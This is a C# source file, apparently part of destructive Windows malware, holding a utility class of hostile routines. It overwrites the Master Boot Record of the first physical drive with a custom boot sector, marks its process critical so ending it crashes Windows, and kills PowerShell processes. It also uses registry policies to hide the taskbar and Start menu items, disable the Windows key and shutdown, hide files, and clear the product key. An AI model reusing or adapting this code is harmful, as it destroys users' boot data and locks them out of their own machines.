using Microsoft.Win32;
using System.Runtime.InteropServices;
using System;
using System.Diagnostics;
using System.Threading;
using System.Management;

public class Utils
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

    [DllImport("user32.dll")]
    private static extern Int32 SwapMouseButton(Int32 bSwap);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll")]
    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("user32.dll")]
    private static extern int FindWindow(string className, string windowText);

    [DllImport("user32.dll")]
    private static extern int ShowWindow(int hwnd, int command);

    private const uint GenericAll = 0x10000000;
    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;
    private const uint OpenExisting = 0x3;
    private const uint MbrSize = 512U;

    public static ProtoRandom.ProtoRandom random = new ProtoRandom.ProtoRandom(2);

    private static string[] startMenuElements = new string[] { "HideAppList", "HideChangeAccountSettings", "HideFrequentlyUsedApps",
        "HideHibernate", "HideLock", "HidePeopleBar", "HidePowerButton", "HideRecentJumplists", "HideRecentlyAddedApps", "HideRestart",
        "HideRestart", "HideShutDown", "HideSignOut", "HideSleep", "HideSwitchAccount", "HideUserTitle" };

    public static void SwapMouseButtons()
    {
        try
        {
            SwapMouseButton(1);
        }
        catch
        { 
        
        }
    }

    public static void HideStartMenu()
    {
        new Thread(() =>
        {
            Thread.Sleep(3500);

            try
            {
                while (FindWindow("Shell_TrayWnd", "") <= 1)
                {
                    Thread.Sleep(100);
                }

                ShowWindow(FindWindow("Shell_TrayWnd", ""), 0x00);
            }
            catch
            {

            }
        }).Start();
    }

    public static void HideElementsFromStartMenu()
    {
        foreach (string startMenuElement in startMenuElements)
        {
            HideElementFromStartMenu(startMenuElement);
        }
    }

    public static void HideElementFromStartMenu(string element)
    {
        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\PolicyManager\default\Start\" + element).SetValue("value", "1", RegistryValueKind.DWord);
        }
        catch
        {

        }
    }

    public static void OverwriteMBR()
    {
        try
        {
            byte[] mbrData = new byte[] { 0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
0x09, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
0x10, 0xEB, 0xF5, 0xC3, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x36, 0x20, 0x68, 0x61,
0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x66, 0x75, 0x6C,
0x6C, 0x79, 0x20, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x65, 0x64, 0x21, 0x20, 0x54, 0x68,
0x61, 0x6E, 0x6B, 0x20, 0x79, 0x6F, 0x75, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
 };
            IntPtr mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint _, IntPtr.Zero);
        }
        catch
        {

        }
    }

    public static void MakeProcessUnkillable()
    {
        try
        {
            RtlSetProcessIsCritical(1, 0, 0);
        }
        catch
        {

        }
    }

    public static void DisableWindowsKey()
    {
        byte[] binary = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0xE0, 0x00, 0x00, 0x5C, 0xE0, 0x00, 0x00, 0x00, 0x00 };

        try
        {
            Registry.LocalMachine.CreateSubKey(@"System\CurrentControlSet\Control\Keyboard Layout", true).SetValue("Scancode Map", binary, RegistryValueKind.Binary);
        }
        catch
        {

        }
    }

    public static void DisableSystemFunction(string systemFunction)
    {
        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\Windows").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\Windows").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System").SetValue(systemFunction, "1", RegistryValueKind.DWord);
        }
        catch
        {

        }
    }

    public static void EnableSystemFunction(string systemFunction)
    {
        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\Windows").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\Windows").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System").SetValue(systemFunction, "0", RegistryValueKind.DWord);
        }
        catch
        {

        }
    }

    public static void HideHiddenFiles()
    {
        new Thread(() =>
        {
            Thread.Sleep(1000);

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");

                if (key != null)
                {
                    key.SetValue("Hidden", 2);
                }
            }
            catch
            {

            }

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer");

                if (key != null)
                {
                    key.SetValue("Hidden", 2);
                }
            }
            catch
            {

            }

            try
            {
                Guid CLSID_ShellApplication = new Guid("13709620-C279-11CE-A49E-444553540000");
                Type shellApplicationType = Type.GetTypeFromCLSID(CLSID_ShellApplication, true);
                object shellApplication = Activator.CreateInstance(shellApplicationType);
                object windows = shellApplicationType.InvokeMember("Windows", System.Reflection.BindingFlags.InvokeMethod, null, shellApplication, new object[] { });
                Type windowsType = windows.GetType();
                object count = windowsType.InvokeMember("Count", System.Reflection.BindingFlags.GetProperty, null, windows, null);

                for (int i = 0; i < (int)count; i++)
                {
                    try
                    {
                        object item = windowsType.InvokeMember("Item", System.Reflection.BindingFlags.InvokeMethod, null, windows, new object[] { i });
                        Type itemType = item.GetType();

                        string itemName = (string)itemType.InvokeMember("Name", System.Reflection.BindingFlags.GetProperty, null, item, null);

                        if (itemName == "Windows Explorer")
                        {
                            itemType.InvokeMember("Refresh", System.Reflection.BindingFlags.InvokeMethod, null, item, null);
                        }
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }).Start();
    }

    public static void DisablePowerFunctions()
    {
        try
        {
            Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").SetValue("ShutdownWithoutLogon", "0", RegistryValueKind.DWord);
        }
        catch
        {

        }

        try
        {
            Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer").SetValue("NoClose", "1", RegistryValueKind.DWord);
        }
        catch
        {

        }
    }

    public static void RestartExplorer()
    {
        using (Process process = new Process())
        {
            process.StartInfo = new ProcessStartInfo
            {
                FileName = "taskkill.exe",
                Arguments = "-f -im explorer.exe",
                WindowStyle = ProcessWindowStyle.Hidden
            };

            process.Start();
            process.WaitForExit();
            process.StartInfo = new ProcessStartInfo("explorer.exe");
            process.Start();
        }
    }
    
    public static void AntiPowershell()
    {
        new Thread(() =>
        {
            Thread.Sleep(1000);

            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (process.ProcessName.ToLower().Contains("powershell"))
                    {
                        process.Kill();
                    }
                }
                catch
                {

                }
            }
        }).Start();
    }

    public static void ClearProductKeyFromRegistry()
    {
        try
        {
            const string query = "SELECT Version FROM SoftwareLicensingService";
            var searcherProd = new ManagementObjectSearcher("\\\\.\\ROOT\\cimv2", query);
            var results = searcherProd.Get();

            foreach (ManagementObject result in results)
            {
                result.InvokeMethod("ClearProductKeyFromRegistry", null);
                break;
            }
        }
        catch
        {

        }
    }
}